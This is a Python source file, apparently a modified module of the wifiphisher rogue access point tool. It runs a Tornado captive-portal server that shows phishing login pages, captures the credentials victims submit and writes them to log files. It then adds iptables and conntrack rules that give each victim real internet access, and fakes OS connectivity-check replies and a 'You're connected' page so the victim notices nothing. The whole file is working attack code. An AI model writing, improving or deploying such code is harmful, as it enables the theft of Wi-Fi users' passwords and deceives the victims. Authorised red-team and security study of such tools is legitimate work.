"""
phishinghttp - Tornado HTTP server for captive portal phishing.

Based on upstream wifiphisher, with post-authentication internet grant:
after a victim submits credentials, iptables rules are added to bypass
the captive portal redirect for that client, granting real internet access.

v7 fixes:
  - Flush conntrack entries after RETURN rule (iOS reuses connections)
  - DNAT DNS to public resolver for granted clients (bypass Android dnsmasq)
  - MASQUERADE limited to internet-facing interface (avoid hotspot loop)
  - iOS CNA dismissal: use Apple's captive portal check URL

v8 fixes:
  - macOS CNA auto-close: RETURN rule now excludes gateway-bound traffic
    so cached-DNS CNA probes still reach tornado via HTTP DNAT.
  - Tornado serves OS-specific "success" responses to granted clients,
    covering all domains from wifiphisher-os-initial-requests.
  - DowngradeToHTTP also handles granted HTTPS probes.
"""

import logging
import json
import re
import subprocess
from tornado.escape import json_decode
import tornado.ioloop
import tornado.web
import tornado.httpserver
import os.path
import wifiphisher.common.uimethods as uimethods
import wifiphisher.common.extensions as extensions
import wifiphisher.common.constants as constants

hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True

template = False
terminate = False
creds = []
logger = logging.getLogger(__name__)

# Track which client IPs have already been granted internet
_granted_clients = set()

# ===================================================================
# Connectivity-check domains (from wifiphisher-os-initial-requests).
# Used to detect CNA/NCSI probes from granted clients and serve the
# correct "success" response so the captive portal window auto-closes.
# ===================================================================

# Apple iOS / macOS CNA
# Expects exact body: <HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>
_APPLE_HOSTS = {
    'captive.apple.com',
    'www.ibook.info',
    'www.itools.info',
    'www.thinkdifferent.us',
    'gsp1.apple.com',
    'www.appleiphonecell.com',
    'apple.com.edgekey.net',
}
_APPLE_PATHS = {
    '/hotspot-detect.html',
    '/library/test/success.html',
}

# Android — expects HTTP 204 (No Content)
_ANDROID_HOSTS = {
    'connectivitycheck.gstatic.com',
    'connectivitycheck.android.com',
    'clients3.google.com',
    'google.com',
    'gstatic.com',
}
_ANDROID_PATHS = {
    '/generate_204',
}

# Kindle — expects HTTP 200 with HTML body
_KINDLE_HOST_FRAGMENT = 'spectrum.s3.amazonaws'
_KINDLE_PATH = '/kindle-wifi/wifistub.html'

# Windows NCSI — expects body: "Microsoft Connect Test"
_WINDOWS_HOSTS = {
    'msftconnecttest.com',
    'www.msftconnecttest.com',
    'msftncsi.com',
    'www.msftncsi.com',
}

# Firefox — expects body containing "success"
_FIREFOX_HOSTS = {
    'detectportal.firefox.com',
}

# Apple CNA: MUST be this exact string (byte-for-byte check by CNA)
_APPLE_SUCCESS = (
    '<HTML><HEAD><TITLE>Success</TITLE></HEAD>'
    '<BODY>Success</BODY></HTML>'
)

_KINDLE_SUCCESS = (
    '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"'
    ' "http://www.w3.org/TR/html4/strict.dtd">'
    '<html><head><title>Kindle Wifi</title></head>'
    '<body>Kindle Wifi connected.</body></html>'
)


def _serve_granted_success(handler):
    """
    For a granted client, check if the request is a connectivity probe
    and serve the appropriate OS-specific success response.

    Returns True if a success response was served, False otherwise.
    """
    host = handler.request.host.split(':')[0].lower()
    path = handler.request.path.lower()

    # --- Apple iOS / macOS CNA ---
    if (host in _APPLE_HOSTS or
            path in _APPLE_PATHS or
            'apple.com' in host or
            'ibook.info' in host or
            'itools.info' in host or
            'thinkdifferent.us' in host or
            'appleiphonecell.com' in host):
        logger.info("Serving Apple Success to granted %s (host=%s)",
                    handler.request.remote_ip, host)
        handler.set_header('Content-Type', 'text/html')
        handler.write(_APPLE_SUCCESS)
        return True

    # --- Android ---
    if (host in _ANDROID_HOSTS or
            path in _ANDROID_PATHS or
            'connectivitycheck' in host):
        logger.info("Serving 204 to granted %s (host=%s)",
                    handler.request.remote_ip, host)
        handler.set_status(204)
        handler.finish()
        return True

    # --- Kindle ---
    if _KINDLE_HOST_FRAGMENT in host or _KINDLE_PATH in path:
        logger.info("Serving Kindle stub to granted %s (host=%s)",
                    handler.request.remote_ip, host)
        handler.set_header('Content-Type', 'text/html')
        handler.write(_KINDLE_SUCCESS)
        return True

    # --- Windows NCSI ---
    if (host in _WINDOWS_HOSTS or
            'msftconnecttest' in host or
            'msftncsi' in host):
        logger.info("Serving MS connecttest to granted %s (host=%s)",
                    handler.request.remote_ip, host)
        handler.set_header('Content-Type', 'text/plain')
        handler.write('Microsoft Connect Test')
        return True

    # --- Firefox ---
    if host in _FIREFOX_HOSTS or 'detectportal.firefox' in host:
        logger.info("Serving Firefox success to granted %s (host=%s)",
                    handler.request.remote_ip, host)
        handler.set_header('Content-Type', 'text/html')
        handler.write('success\n')
        return True

    # --- User-Agent fallback (CaptiveNetworkSupport, WISPr) ---
    ua = handler.request.headers.get('User-Agent', '').lower()
    if ('captivenetworksupport' in ua or
            'wispr' in ua or
            'cna' in ua):
        logger.info("Serving CNA fallback success to granted %s "
                    "(host=%s ua=%s)", handler.request.remote_ip,
                    host, ua[:60])
        handler.set_header('Content-Type', 'text/html')
        handler.write(_APPLE_SUCCESS)
        return True

    return False


def _get_default_route_iface():
    """Detect the internet-facing interface from the default route."""
    try:
        out = subprocess.check_output(
            ['ip', 'route', 'show', 'default'],
            stderr=subprocess.PIPE
        ).decode('utf-8', errors='replace')
        match = re.search(r'dev\s+(\S+)', out)
        if match:
            return match.group(1)
    except (subprocess.CalledProcessError, OSError):
        pass
    return None


def _get_hotspot_iface():
    """Get the hotspot interface from the AccessPoint module if available."""
    try:
        from wifiphisher.common.accesspoint import detect_android_hotspot
        iface, _ = detect_android_hotspot()
        return iface
    except (ImportError, Exception):
        return None


def grant_internet(client_ip):
    """
    Grant full internet access to a client after credential capture.

    Key fixes:
      v7: flush conntrack after RETURN rule (iOS reuses connections).
      v8: RETURN rule excludes gateway-bound traffic (! -d GW_IP) so
          macOS CNA probes with cached DNS still reach tornado -> Success.
    """
    if client_ip in _granted_clients:
        return
    _granted_clients.add(client_ip)

    gw_ip = constants.NETWORK_GW_IP
    logger.info("Granting internet to %s...", client_ip)

    # Detect interfaces for targeted rules
    inet_iface = _get_default_route_iface()
    hotspot_iface = _get_hotspot_iface()

    # ---------------------------------------------------------------
    # 1) DNS: DNAT to public resolver for this client.
    # ---------------------------------------------------------------
    subprocess.call(
        'iptables -t nat -I PREROUTING 1 -s %s -p udp --dport 53 '
        '-j DNAT --to-destination 8.8.8.8:53' % client_ip,
        shell=True)
    subprocess.call(
        'iptables -t nat -I PREROUTING 2 -s %s -p tcp --dport 53 '
        '-j DNAT --to-destination 8.8.8.8:53' % client_ip,
        shell=True)

    # ---------------------------------------------------------------
    # 2) RETURN — but NOT for traffic destined to the gateway itself.
    #
    #    macOS CNA does background probes using the OS DNS cache
    #    (mDNSResponder), which still maps captive.apple.com to the
    #    gateway IP from the wildcard dnsmasq phase. With a blanket
    #    RETURN, those packets skip the HTTP DNAT (:80 -> :8080) and
    #    arrive at gateway:80 where nothing listens -> probe fails
    #    -> CNA window stays open.
    #
    #    "! -d GW_IP" ensures gateway-bound HTTP still falls through
    #    to the DNAT rule, reaching tornado, which serves the Apple
    #    "Success" response -> macOS CNA auto-closes.
    #
    #    iOS doesn't need this because the CNA WebView triggers a
    #    fresh DNS lookup (via the JS redirect), which goes through
    #    the DNAT to 8.8.8.8 and resolves to the real Apple IP.
    # ---------------------------------------------------------------
    subprocess.call(
        'iptables -t nat -I PREROUTING 3 -s %s ! -d %s -j RETURN'
        % (client_ip, gw_ip),
        shell=True)

    # ---------------------------------------------------------------
    # 3) FLUSH CONNTRACK for this client.
    # ---------------------------------------------------------------
    subprocess.call(
        'conntrack -D -s %s 2>/dev/null' % client_ip, shell=True)
    subprocess.call(
        'conntrack -D -d %s 2>/dev/null' % client_ip, shell=True)

    # ---------------------------------------------------------------
    # 4) FORWARD: allow this client's traffic to be forwarded.
    # ---------------------------------------------------------------
    subprocess.call(
        'iptables -I FORWARD 1 -s %s -j ACCEPT' % client_ip,
        shell=True)
    subprocess.call(
        'iptables -I FORWARD 1 -d %s -m state --state RELATED,ESTABLISHED '
        '-j ACCEPT' % client_ip,
        shell=True)

    # ---------------------------------------------------------------
    # 5) ip_forward
    # ---------------------------------------------------------------
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
    except (IOError, OSError):
        pass

    # ---------------------------------------------------------------
    # 6) MASQUERADE — scoped to internet-facing interface if detected.
    # ---------------------------------------------------------------
    if inet_iface:
        subprocess.call(
            'iptables -t nat -C POSTROUTING -o %s -j MASQUERADE 2>/dev/null || '
            'iptables -t nat -A POSTROUTING -o %s -j MASQUERADE'
            % (inet_iface, inet_iface),
            shell=True)
    elif hotspot_iface:
        subprocess.call(
            'iptables -t nat -C POSTROUTING ! -o %s -j MASQUERADE 2>/dev/null || '
            'iptables -t nat -A POSTROUTING ! -o %s -j MASQUERADE'
            % (hotspot_iface, hotspot_iface),
            shell=True)
    else:
        subprocess.call(
            'iptables -t nat -C POSTROUTING -j MASQUERADE 2>/dev/null || '
            'iptables -t nat -A POSTROUTING -j MASQUERADE',
            shell=True)

    logger.info("Granted internet to %s", client_ip)

    # Log to dedicated grant file for TUI feed (separate from HTTP requests)
    try:
        with open('/tmp/wifiphisher-grants.tmp', 'a') as f:
            f.write("Internet granted to %s via %s\n"
                    % (client_ip, inet_iface or 'default'))
    except (IOError, OSError):
        pass


class DowngradeToHTTP(tornado.web.RequestHandler):
    def get(self):
        client_ip = self.request.remote_ip

        # Granted clients probing via HTTPS (macOS CNA sometimes
        # retries on :443): serve OS-specific success directly.
        if client_ip in _granted_clients:
            if _serve_granted_success(self):
                return

        gw = constants.NETWORK_GW_IP
        port = constants.PORT
        self.redirect("http://%s:%s/" % (gw, port))


class BackendHandler(tornado.web.RequestHandler):
    """
    Validate the POST requests from client by the uimethods
    """

    def initialize(self, em):
        self.em = em

    def post(self):
        json_obj = json_decode(self.request.body)
        response_to_send = {}
        backend_methods = self.em.get_backend_funcs()
        for func_name in list(json_obj.keys()):
            if func_name in backend_methods:
                callback = getattr(backend_methods[func_name], func_name)
                response_to_send[func_name] = callback(json_obj[func_name])
            else:
                response_to_send[func_name] = "NotFound"

        self.write(json.dumps(response_to_send))


class CaptivePortalHandler(tornado.web.RequestHandler):
    def get(self):
        client_ip = self.request.remote_ip

        # ---------------------------------------------------------------
        # GRANTED CLIENTS: serve OS-specific "Success" responses.
        #
        # After grant_internet(), real internet traffic bypasses tornado.
        # But gateway-bound traffic (from cached DNS) still arrives here
        # via the HTTP DNAT rule. We serve the correct success response
        # so the OS CNA detects "internet is working" and auto-closes.
        # ---------------------------------------------------------------
        if client_ip in _granted_clients:
            if _serve_granted_success(self):
                return

        # ---------------------------------------------------------------
        # NORMAL CAPTIVE PORTAL: serve phishing page
        # ---------------------------------------------------------------
        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())

        log_file_path = "/tmp/wifiphisher-webserver.tmp"
        with open(log_file_path, "a+") as log_file:
            log_file.write("GET request from {0} for {1}\n".format(
                self.request.remote_ip, self.request.full_url()))
        logger.info("GET request from %s for %s", self.request.remote_ip,
                    self.request.full_url())

    def post(self):
        global terminate

        # check the http POST request header contains the Content-Type
        try:
            content_type = self.request.headers["Content-Type"]
        except KeyError:
            return

        # check if this is a valid phishing post request
        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
            post_data = tornado.escape.url_unescape(self.request.body)
            log_file_path = "/tmp/wifiphisher-webserver.tmp"
            with open(log_file_path, "a+") as log_file:
                log_file.write("POST request from {0} with {1}\n".format(
                    self.request.remote_ip, post_data))
                logger.info("POST request from %s with %s",
                            self.request.remote_ip, post_data)

            creds.append(post_data)
            terminate = True

            # Log credentials to dedicated file for TUI feed (parsed)
            try:
                from urllib.parse import parse_qs
                parsed = parse_qs(post_data, keep_blank_values=True)
                # Build readable "key: value" pairs
                parts = []
                for k, vals in parsed.items():
                    # Strip common wfphshr/wfphsr prefixes for cleaner display
                    clean_key = k
                    for prefix in ('wfphshr', 'wfphsr', 'wfphsh'):
                        if clean_key.startswith(prefix):
                            clean_key = clean_key[len(prefix):]
                            break
                    parts.append("%s: %s" % (clean_key.capitalize(),
                                             vals[0] if vals else ''))
                display = " | ".join(parts) if parts else post_data
                with open('/tmp/wifiphisher-creds.tmp', 'a') as f:
                    f.write("%s -> %s\n" % (self.request.remote_ip, display))
            except (IOError, OSError, Exception):
                pass

            # --- POST-AUTH: grant internet and redirect ---
            client_ip = self.request.remote_ip
            grant_internet(client_ip)

            # Redirect to OS-appropriate connectivity check URL.
            # This speeds up CNA dismissal by triggering a re-probe.
            check_url_apple = "http://captive.apple.com/hotspot-detect.html"
            check_url_android = "http://connectivitycheck.gstatic.com/generate_204"
            check_url_windows = "http://www.msftconnecttest.com/connecttest.txt"

            self.write(
                '<!DOCTYPE html>'
                '<html><head><meta charset="utf-8">'
                '<meta name="viewport" content="width=device-width,initial-scale=1">'
                '<title>Connection Successful</title>'
                '<style>'
                '*{margin:0;padding:0;box-sizing:border-box}'
                'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",'
                'Roboto,Helvetica,Arial,sans-serif;background:#f5f5f7;'
                'display:flex;justify-content:center;align-items:center;'
                'min-height:100vh;color:#1d1d1f}'
                '.container{text-align:center;padding:48px 32px;max-width:420px;'
                'width:90%}'
                '.icon{width:72px;height:72px;margin:0 auto 24px;'
                'background:#34c759;border-radius:50%;display:flex;'
                'align-items:center;justify-content:center}'
                '.icon svg{width:36px;height:36px;fill:none;stroke:#fff;'
                'stroke-width:3;stroke-linecap:round;stroke-linejoin:round}'
                'h1{font-size:22px;font-weight:600;margin-bottom:8px}'
                '.subtitle{font-size:15px;color:#86868b;line-height:1.5;'
                'margin-bottom:28px}'
                '.progress-bar{width:100%;height:3px;background:#e5e5ea;'
                'border-radius:2px;overflow:hidden;margin-bottom:20px}'
                '.progress-bar .fill{height:100%;background:#34c759;'
                'border-radius:2px;animation:load 2.5s ease-in-out forwards}'
                '@keyframes load{0%{width:0}100%{width:100%}}'
                '.footer{font-size:12px;color:#aeaeb2}'
                '</style></head>'
                '<body>'
                '<div class="container">'
                '<div class="icon"><svg viewBox="0 0 24 24">'
                '<polyline points="20 6 9 17 4 12"/></svg></div>'
                '<h1>You&#8217;re connected</h1>'
                '<p class="subtitle">You now have internet access.<br>'
                'This window will close automatically.</p>'
                '<div class="progress-bar"><div class="fill"></div></div>'
                '<p class="footer">Secured by network authentication</p>'
                '</div>'
                '<script>'
                'var ua=navigator.userAgent;'
                'var isApple=/Macintosh|iPad|iPhone|iPod/.test(ua);'
                'var isWin=/Windows/.test(ua);'
                'var url=isApple?"' + check_url_apple + '":'
                'isWin?"' + check_url_windows + '":"' + check_url_android + '";'
                'setTimeout(function(){window.location.href=url;},2800);'
                '</script>'
                '</body></html>'
            )
            return

        # Non-credential POST: serve the template as usual
        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())


def runHTTPServer(ip, port, ssl_port, t, em):
    global template
    template = t

    # Save template name for TUI display
    try:
        tpl_name = (getattr(t, 'name', None) or
                    getattr(t, 'display_name', None))
        if not tpl_name:
            # Extract from template path: .../phishing-pages/facebook/html/ -> facebook
            path = t.get_path().rstrip('/')
            basename = os.path.basename(path)
            # If basename is generic (html, www, static...), go up one level
            if basename.lower() in ('html', 'www', 'static', 'public', 'templates'):
                basename = os.path.basename(os.path.dirname(path))
            tpl_name = basename
        # Capitalize for display: "facebook-login" -> "Facebook Login"
        tpl_name = tpl_name.replace('-', ' ').replace('_', ' ').title()
        with open('/tmp/wifiphisher-template.tmp', 'w') as f:
            f.write(tpl_name)
    except (IOError, OSError, Exception):
        pass

    # Get all the UI funcs and set them to uimethods module
    for f in em.get_ui_funcs():
        setattr(uimethods, f.__name__, f)

    app = tornado.web.Application(
        [
            (r"/backend/.*", BackendHandler, {
                "em": em
            }),
            (r"/.*", CaptivePortalHandler),
        ],
        template_path=template.get_path(),
        static_path=template.get_path_static(),
        compiled_template_cache=False,
        ui_methods=uimethods)
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
    https_server = tornado.httpserver.HTTPServer(
        ssl_app,
        ssl_options={
            "certfile": constants.PEM,
            "keyfile": constants.PEM,
        })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
